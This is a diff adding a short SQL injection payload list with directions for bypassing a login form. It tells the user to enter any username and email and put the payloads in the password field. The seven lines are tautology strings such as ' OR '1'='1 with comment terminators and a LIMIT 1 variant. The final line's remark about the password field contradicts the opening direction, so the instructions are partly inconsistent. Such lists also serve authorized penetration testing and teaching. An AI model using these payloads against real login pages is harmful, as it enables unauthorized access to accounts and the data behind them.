@@ -1,0 +1,9 @@
+Note: Usernames and Emails will not allow to enter the payloads so enter any usersnames and emails in the section and apply the below payloads in the password field
+
+' OR '1'='1
+' or '1'='1
+' or '1'='1' -- exploit
+' or '1'='1'-- exploit
+' or '1'='1'## exploit
+' or '1'='1'--exploit
+' OR 1 = 1 LIMIT 1 -- ' {and enter anything in paswword field, OR 1 = 1 LIMIT 1 is a condition that will always be true and limits the returned results to only one record.}
